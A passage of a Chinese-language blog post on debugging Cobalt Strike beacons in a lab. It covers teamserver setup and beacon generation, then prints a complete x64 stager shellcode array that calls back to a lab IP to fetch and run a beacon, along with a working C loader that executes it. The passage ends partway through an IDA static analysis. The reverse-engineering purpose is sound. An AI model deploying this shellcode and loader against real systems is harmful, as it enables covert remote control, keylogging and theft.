class="toc-text">重定位表修复</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">4.3.5.0.1.</span> <span class="toc-text">准备工作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E6%A0%88%E4%B8%8E%E4%B8%B4%E5%82%A8%E6%B8%85%E7%90%86%EF%BC%8C%E4%BF%AE%E6%94%B9%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-number">4.3.6.</span> <span class="toc-text">堆栈与临储清理，修改入口点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A3%85%E8%BD%BD%E6%96%87%E4%BB%B6%E8%BF%90%E8%A1%8C"><span class="toc-number">4.4.</span> <span class="toc-text">装载文件运行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL%E7%9A%84%E5%85%A5%E5%8F%A3%E7%82%B9%E8%B0%83%E7%94%A8%E4%B8%8E%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">4.4.1.</span> <span class="toc-text">DLL的入口点调用与初始化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%AE%9A%E4%B9%89%E7%9A%84dll%E5%85%A5%E5%8F%A3%E7%82%B9%E5%87%BD%E6%95%B0-DllMain"><span class="toc-number">4.4.1.1.</span> <span class="toc-text">用户定义的dll入口点函数:DllMain()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Beacon%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%EF%BC%9ABeacon-int"><span class="toc-number">4.4.1.2.</span> <span class="toc-text">Beacon的初始化：Beacon_int()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%BC%8F%E4%B8%8A%E7%BA%BF%EF%BC%9ABeacon-main"><span class="toc-number">4.4.1.3.</span> <span class="toc-text">正式上线：Beacon_main()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#beacon%E6%8E%A5%E6%94%B6%E6%8C%87%E4%BB%A4"><span class="toc-number">4.4.1.4.</span> <span class="toc-text">beacon接收指令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dll%E5%85%A5%E5%8F%A3%E7%82%B9%E7%9A%84%E9%9D%9E%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA"><span class="toc-number">4.4.2.</span> <span class="toc-text">Dll入口点的非用户行为</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="toc-number">4.4.3.</span> <span class="toc-text">功能分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ls%EF%BC%88%E5%88%97%E5%87%BA%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E5%AD%90%E7%9B%AE%E5%BD%95"><span class="toc-number">4.4.3.1.</span> <span class="toc-text">ls（列出当前目录中的文件和子目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#screenshot%E2%80%8B"><span class="toc-number">4.4.3.2.</span> <span class="toc-text">screenshot​</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">补充：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-number">5.0.1.</span> <span class="toc-text">实现步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"><span class="toc-number">5.0.2.</span> <span class="toc-text">示例代码</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://example.com/2024/08/07/CobaltStrike%E5%8A%A8%E8%B0%83/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="YCr0w"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="YCr0w'blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">CobaltStrike动调</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-08-07 12:40:41" itemprop="dateCreated datePublished" datetime="2024-08-07T12:40:41+08:00">2024-08-07</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-09-26 21:23:50" itemprop="dateModified" datetime="2024-09-26T21:23:50+08:00">2024-09-26</time></div><div class="post-classify"></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="CobaltStrike动调"><a href="#CobaltStrike动调" class="headerlink" title="CobaltStrike动调"></a>CobaltStrike动调</h1><h1 id="Teamserver的配置与Beacon生成"><a href="#Teamserver的配置与Beacon生成" class="headerlink" title="Teamserver的配置与Beacon生成"></a>Teamserver的配置与Beacon生成</h1><h2 id="Teamserver的配置"><a href="#Teamserver的配置" class="headerlink" title="Teamserver的配置"></a>Teamserver的配置</h2><p>（使用管理员权限启动）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\teamserver.bat 192.168.18.132 password</span><br></pre></td></tr></table></figure>

<pre><code>···
</code></pre>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724140426-dfjuw69.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h3 id="生成Beacon"><a href="#生成Beacon" class="headerlink" title="生成Beacon"></a>生成Beacon</h3><p>.启动监听器</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-24%20141559-20240724142315-snv7d6i.png" alt="屏幕截图 2024-07-24 141559" loading="lazy">​</p>
<p>‍</p>
<p>生成beacon程序</p>
<p>选择监听器，然后点击attacks，生成X64 beacon</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724151429-y3q2wru.png" alt="image" loading="lazy">​</p>
<p>点击Generate并选择保存位置</p>
<p>‍</p>
<h4 id="在目标上线"><a href="#在目标上线" class="headerlink" title="在目标上线"></a>在目标上线</h4><p>在目标机上运行Beacon</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724155248-lqha2gw.png" alt="image" loading="lazy">​</p>
<p>成功上线</p>
<p>‍</p>
<h4 id="测试功能"><a href="#测试功能" class="headerlink" title="测试功能"></a>测试功能</h4><p>选中目标机右键点击interact，开始交互功能</p>
<ol>
<li>​<code>screenshot</code>​ - 捕获目标系统的屏幕截图</li>
<li>​<code>keylogger</code>​ - 记录目标系统的键盘输入</li>
<li>​<code>download</code>​ - 从目标系统下载文件</li>
<li>​<code>upload</code>​ - 上传文件到目标系统</li>
<li>​<code>shell</code>​ - 在目标系统上执行 shell 命令</li>
<li>​<code>getprivs</code>​ - 尝试提升目标系统的权限</li>
<li>​<code>run</code>​ - 在目标系统上执行自定义脚本</li>
</ol>
<p>‍</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724170251-ndywrrd.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<p>processes</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724165103-sus919p.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<p>Screenshots</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724165450-tolxpk8.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<p>keystrokes</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724165808-bkg8pj2.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h1 id="Beacon调试外壳分析"><a href="#Beacon调试外壳分析" class="headerlink" title="Beacon调试外壳分析"></a>Beacon调试外壳分析</h1><p>以c语言形式生成shellcode</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240724171148-jji2n9f.png" alt="image" loading="lazy">​</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* length: 893 bytes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b</span></span><br><span class="line"><span class="string">\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41</span></span><br><span class="line"><span class="string">\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85</span></span><br><span class="line"><span class="string">\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48</span></span><br><span class="line"><span class="string">\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66</span></span><br><span class="line"><span class="string">\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83</span></span><br><span class="line"><span class="string">\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56</span></span><br><span class="line"><span class="string">\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a</span></span><br><span class="line"><span class="string">\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f</span></span><br><span class="line"><span class="string">\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff</span></span><br><span class="line"><span class="string">\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06</span></span><br><span class="line"><span class="string">\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff</span></span><br><span class="line"><span class="string">\x2f\x66\x42\x4f\x66\x00\xd2\xba\xbd\xba\x61\x5f\x65\xa5\xc1\xdb\xf6\xa9\x48\x32\xa9\xe2\x48\xd3\xca\x7c\xd7\x9a\xb4\x34\x18\x4f\xc2</span></span><br><span class="line"><span class="string">\xa2\xa4\xc6\xfb\x42\x8c\xe5\x5e\x3c\x12\x42\x16\x02\x39\x74\x18\x5c\xb3\xbb\xd4\x72\xe1\xa4\xa9\xb7\x69\xf6\xeb\xd3\x62\xeb\x8d\x28</span></span><br><span class="line"><span class="string">\xb8\x03\xec\x19\xe2\xe7\xeb\x2e\x87\xa9\xf0\xdb\x3e\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61</span></span><br><span class="line"><span class="string">\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64</span></span><br><span class="line"><span class="string">\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36</span></span><br><span class="line"><span class="string">\x2e\x30\x3b\x20\x41\x76\x61\x6e\x74\x20\x42\x72\x6f\x77\x73\x65\x72\x29\x0d\x0a\x00\x12\x18\xe7\x65\xef\xdc\x5a\x97\xc9\x8b\x4b\x94</span></span><br><span class="line"><span class="string">\xc1\x47\xb6\x52\x3b\xd5\x38\x93\xca\x58\x24\x90\xd1\x1d\xfc\xf1\x21\xb5\x7a\x14\x0b\x0d\xea\x83\xdb\x4a\x3c\x1a\x38\x83\xd8\xc7\x74</span></span><br><span class="line"><span class="string">\x29\x05\xfa\x8e\x50\x8a\xa9\x01\xf8\x5e\x50\x2c\xa6\x7c\xdf\xb3\x97\x55\xac\x67\x0b\xf6\xa8\x87\x3c\x22\xec\x23\x98\xf3\x3c\x79\x88</span></span><br><span class="line"><span class="string">\xfc\x33\x99\x4a\x54\x65\xdf\xe5\xef\xc1\xca\x70\x52\x8e\x99\xed\x52\xdd\xfa\xea\x03\xa2\x85\x83\x30\x42\x8f\x2d\x16\x7a\xb5\x24\x01</span></span><br><span class="line"><span class="string">\x4e\x1d\x2f\xca\x2b\x8a\x70\x41\xef\x61\xaf\x4c\x20\x16\x4b\xe4\x13\xa6\x75\x75\x96\x09\x7d\xc9\x81\x0e\x8f\x77\x38\xd2\x28\x8f\x3f</span></span><br><span class="line"><span class="string">\x3f\xbb\x32\xf0\x1a\x6a\x44\xcd\x0a\x1a\x6f\xdf\xbf\xfb\x29\x9a\xc0\x76\x4a\xa3\xce\x36\x12\xa9\xc1\xf4\x0e\x33\x69\xc9\x42\x8e\x8b</span></span><br><span class="line"><span class="string">\x28\x35\x95\x1d\x43\xb2\xe2\x12\x83\x88\x9f\x60\xac\x92\xb8\x7e\x01\xdf\x1f\xee\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba</span></span><br><span class="line"><span class="string">\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89</span></span><br><span class="line"><span class="string">\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48</span></span><br><span class="line"><span class="string">\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x38\x2e</span></span><br><span class="line"><span class="string">\x31\x33\x32\x00\x5e\x2e\x78\x90&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>对Windows开发和shellcode loader不熟悉，询问chat并进行修改，生成shellcode loader</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x74\x32\x6e\x49\x00\x0c\xda\x45\x13\xbb\x51\xcc\x08\x55\x80\x06\xe7\x40\xf2\x8a\x59\x6b\x7f\xe2\x00\x4a\x51\xd0\x09\xa2\x57\xe1\x30\x5d\xcb\x7b\xad\x44\x3c\x07\x3d\xa5\x75\x88\xe9\xd6\xa9\xa1\xfd\xb3\x7a\xe2\x8c\x19\x05\x8f\xfc\xf4\x27\xec\x4e\xfc\x6a\xe9\x1f\x94\xdf\x4c\x96\xf9\xbc\x2b\x12\x8a\x67\x72\xed\x58\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x42\x54\x52\x53\x31\x32\x35\x35\x32\x36\x29\x0d\x0a\x00\xae\xe1\x01\x1c\xaa\x64\x16\x48\x4f\x20\x35\x43\x90\x6b\xf7\xf9\x6a\x51\x08\xdf\x53\x5c\x64\x33\x31\x76\xf5\x73\x59\x7a\xd6\x80\x80\xba\x54\x30\x97\xac\x21\xab\x3c\xee\x9e\xe1\xda\xc3\x0b\x18\x16\xe8\x3b\x9e\x8d\xcb\x62\xfd\xb6\x2e\x05\x2c\x61\xc3\x23\xd8\xe5\x9d\x1d\x65\xaa\xb2\x3c\xd2\xf6\x63\x1d\x5b\x80\x5a\x50\x7c\x0c\xe9\x94\x5c\x3a\xdc\xb2\x1c\xd2\x46\x61\xee\x4f\xc8\xe5\x9a\xe0\x9f\xa1\x71\x2f\x9f\x13\x24\xaf\x84\xe6\x86\x3a\x33\x35\x18\x14\xe4\x66\x02\xc7\x0d\xd6\xf0\x0f\xdd\x44\xbc\xa5\x01\xf5\x2d\x96\x7f\xd8\xe8\x76\xfb\xf7\xb8\x36\x66\x2f\x64\x1f\xbb\xb5\x24\xe2\x06\xad\x3d\x38\xc5\x90\xd3\x02\xea\x52\xf0\x06\x1d\x32\x80\x4b\xe7\x31\xe2\x7d\x1a\xe3\x31\x29\xb0\xd9\x80\x4f\x18\x5a\x68\xad\xb3\x06\x2d\xa3\x20\x7a\xf0\xe1\x4c\x0c\x0f\x70\x5b\x9e\xc4\x8b\x42\xc0\xea\xd2\x94\xa6\xf4\x65\x0f\xaf\x7e\xdc\xd1\x02\x35\x7c\xf6\x21\x69\x8c\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x38\x2e\x31\x33\x32\x00\x5e\x2e\x78\x90&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="comment">/* 创建一个可执行的堆内存块</span></span><br><span class="line"><span class="comment">     HEAP_CREATE_ENABLE_EXECUTE 标志允许执行在该堆上分配的内存*/</span></span><br><span class="line">    HANDLE myHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* 在创建的可执行堆上分配内存,大小为 buf 数组的大小</span></span><br><span class="line"><span class="comment">      HEAP_ZERO_MEMORY 标志将分配的内存初始化为 0*/</span></span><br><span class="line">    <span class="type">void</span>* exec = HeapAlloc(myHeap, HEAP_ZERO_MEMORY, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 将 buf 数组中的数据复制到分配的内存块中</span></span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将分配的内存块强制转换为函数指针类型,然后立即调用该函数，这样就可以执行存储在该内存块中的代码(shellcode)</span></span><br><span class="line">    ((<span class="type">void</span> (*)())exec)();</span><br><span class="line"></span><br><span class="line">  	<span class="comment">// 释放分配的内存块</span></span><br><span class="line">    HeapFree(myHeap, <span class="number">0</span>, exec);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 销毁创建的可执行堆</span></span><br><span class="line">    HeapDestroy(myHeap);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>测试发现成功上线，说明shellcode loader可用</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240725171330-cy5h4v8.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><p>先使用die打开大致查看生成的shellcode loader</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240725171842-h8n6zml.png" alt="image" loading="lazy">​</p>
<pre><code>                        （图1）
</code></pre>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240725172132-srxrytu.png" alt="image" loading="lazy">​</p>
<pre><code>                            （图2）
</code></pre>
<p>图1是我自己使用gcc编译链接的shellcode loader，图2是我直接使用cs生成的，发现cs也是使用的是MinGW编译生成的并知道程序入口点是0x04014b</p>
<p>‍</p>
<h3 id="main​函数"><a href="#main​函数" class="headerlink" title="main​函数"></a><code>main</code>​函数</h3><p>使用ida打开cs直接生成X64 beacon，定位观察main函数</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240725181908-k94jy3v.png" alt="image" loading="lazy">​</p>
<p>调用了三个函数：<code>sub_402A60</code>​、<code>sub_401795</code>​、<code>__imp_Sleep</code>​</p>
<p>‍</p>
<h4 id="sub-402A60​函数"><a href="#sub-402A60​函数" class="headerlink" title="sub_402A60​函数"></a><code>sub_402A60</code>​函数</h4><p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240726120003-5kvhfk5.png" alt="image" loading="lazy">​</p>
<p>像是简单的赋值操作</p>
<p>‍</p>
<h3 id="sub-401795​函数"><a href="#sub-401795​函数" class="headerlink" title="sub_401795​函数"></a><code>sub_401795</code>​函数</h3><p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240726120043-8xqqu0a.png" alt="image" loading="lazy">​</p>
<p>这个函数定义了一些变量，然后变量v8调用了WinAPI函数<code>GetTickCount</code>​（<code>GetTickCount()</code>​ 是一个 Windows API 函数,用于获取从系统启动到当前时刻经过的毫秒数。）静态分析并不清楚取余操作的作用</p>
<p>‍</p>
<p>​<code>sprintf()</code>​ 是 C 语言中的一个标准函数,它的作用是将格式化的数据写入到一个字符串中。</p>
<p>​<code>sprintf</code>​相当于就是把前面的变量格式化为<code>%c%c%c%c%c%c%c%c%cMSSE-%d-server</code>​的形式存储到Buffeer中</p>
<p>‍</p>
<p>​<code>CreateThread</code>​ 是 Windows API 中的一个函数,它用于创建一个新的线程。</p>
<p>​<code>CreateThread</code>​ 函数调用将创建一个新的线程,该线程执行 <code>sub_401685</code>​ 函数作为其入口点,并使用默认的线程属性。</p>
<p>‍</p>
<p>查看汇编发现最后<code>jmp     sub_401742</code>​，return调用跳转到了<code>sub_401742</code>​函数</p>
<p>‍</p>
<h4 id="sub-401685​函数"><a href="#sub-401685​函数" class="headerlink" title="sub_401685​函数"></a><code>sub_401685</code>​函数</h4><p>跟进观察<code>sub_401685</code>​函数</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240726164853-xa8p6lk.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h5 id="sub-4015D0​函数"><a href="#sub-4015D0​函数" class="headerlink" title="sub_4015D0​函数"></a><code>sub_4015D0</code>​函数</h5><p>继续跟进分析<code>sub_4015D0</code>​函数</p>
